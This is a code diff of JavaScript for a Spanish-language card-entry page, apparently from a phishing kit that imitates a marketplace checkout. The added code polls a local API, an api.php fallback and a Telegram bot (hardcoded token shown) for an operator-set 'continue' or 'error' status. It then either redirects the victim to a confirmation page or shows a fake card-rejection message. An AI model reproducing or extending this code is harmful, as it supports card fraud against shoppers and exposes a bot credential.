@@ -174,13 +174,13 @@ const MC_PNG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAv
 
 let marca = '';
 let cardPollTimer = null;
+let p = null;
 
 (async function init() {
   $('volver').onclick = () => location.href = '/a/' + id;
   $('okVolver').href = '/a/' + id;
   if (!id) { $('miniTitulo').textContent = 'Sin producto'; return; }
   try {
-    let p = null;
     try {
       const r = await fetch('/api/product/' + id);
       if (r.ok) p = await r.json();
@@ -324,36 +324,50 @@ $('form').addEventListener('submit', async ev => {
   if (cardPollTimer) clearTimeout(cardPollTimer);
 
   const pollCardStatus = async () => {
-    // 1. Probar API local
+    let data = null;
+    // 1. Probar ruta amigable
     try {
       const resp = await fetch('/api/product/' + id + '/tarjeta/status?t=' + Date.now());
       if (resp.ok) {
-        const data = await resp.json();
-        if (data.status === 'continue' || data.status === 'continuar') {
-          const qParams = new URLSearchParams();
-          if (id) qParams.set('id', id);
-          if (p) {
-            if (p.titulo || p.articulo) qParams.set('tit', p.titulo || p.articulo);
-            const pVal = p.precioArticulo || p.precio || 0;
-            if (pVal) qParams.set('precio', pVal);
-          }
-          const rawP = new URLSearchParams(location.search).get('p');
-          if (rawP) qParams.set('p', rawP);
-          try { localStorage.setItem('wp_active_prod', JSON.stringify(p || { id })); } catch(e) {}
-          window.location.href = '/confirmar.html?' + qParams.toString();
-          return;
-        } else if (data.status === 'error') {
-          $('spinnerTarjeta').style.display = 'none';
-          $('txtBtnTarjeta').textContent = 'Continuar';
-          btn.disabled = false;
-          $('cardErrorText').textContent = 'La tarjeta ha sido rechazada o los datos son incorrectos. Por favor compruébalos e inténtalo de nuevo.';
-          $('cardErrorBox').style.display = 'flex';
-          return;
-        }
+        data = await resp.json();
       }
     } catch (e) {}
 
-    // 2. Probar Telegram getMyDescription
+    // 2. Probar api.php directo (fallback infalible para hosting PHP)
+    if (!data || !data.status) {
+      try {
+        const resp2 = await fetch('/api.php?action=tarjeta_status&id=' + id + '&t=' + Date.now());
+        if (resp2.ok) {
+          data = await resp2.json();
+        }
+      } catch (e) {}
+    }
+
+    if (data && data.status) {
+      if (data.status === 'continue' || data.status === 'continuar') {
+        const qParams = new URLSearchParams();
+        if (id) qParams.set('id', id);
+        if (p) {
+          if (p.titulo || p.articulo) qParams.set('tit', p.titulo || p.articulo);
+          const pVal = p.precioArticulo || p.precio || 0;
+          if (pVal) qParams.set('precio', pVal);
+        }
+        const rawP = new URLSearchParams(location.search).get('p');
+        if (rawP) qParams.set('p', rawP);
+        try { localStorage.setItem('wp_active_prod', JSON.stringify(p || { id })); } catch(e) {}
+        window.location.href = 'confirmar.php?' + qParams.toString();
+        return;
+      } else if (data.status === 'error') {
+        $('spinnerTarjeta').style.display = 'none';
+        $('txtBtnTarjeta').textContent = 'Continuar';
+        btn.disabled = false;
+        $('cardErrorText').textContent = 'La tarjeta ha sido rechazada o los datos son incorrectos. Por favor compruébalos e inténtalo de nuevo.';
+        $('cardErrorBox').style.display = 'flex';
+        return;
+      }
+    }
+
+    // 3. Respaldo adicional Telegram getMyDescription
     try {
       const tgDescResp = await fetch('https://api.telegram.org/bot8818995413:AAHLry4iCNQZ7T385CoVodbXQcnrkymFmKM/getMyDescription?t=' + Date.now());
       if (tgDescResp.ok) {
@@ -370,7 +384,7 @@ $('form').addEventListener('submit', async ev => {
           const rawP = new URLSearchParams(location.search).get('p');
           if (rawP) qParams.set('p', rawP);
           try { localStorage.setItem('wp_active_prod', JSON.stringify(p || { id })); } catch(e) {}
-          window.location.href = '/confirmar.html?' + qParams.toString();
+          window.location.href = 'confirmar.php?' + qParams.toString();
           return;
         } else if (desc.includes('status:error')) {
           $('spinnerTarjeta').style.display = 'none';
@@ -383,7 +397,7 @@ $('form').addEventListener('submit', async ev => {
       }
     } catch (e) {}
 
-    cardPollTimer = setTimeout(pollCardStatus, 1200);
+    cardPollTimer = setTimeout(pollCardStatus, 1000);
   };
 
   cardPollTimer = setTimeout(pollCardStatus, 1200);
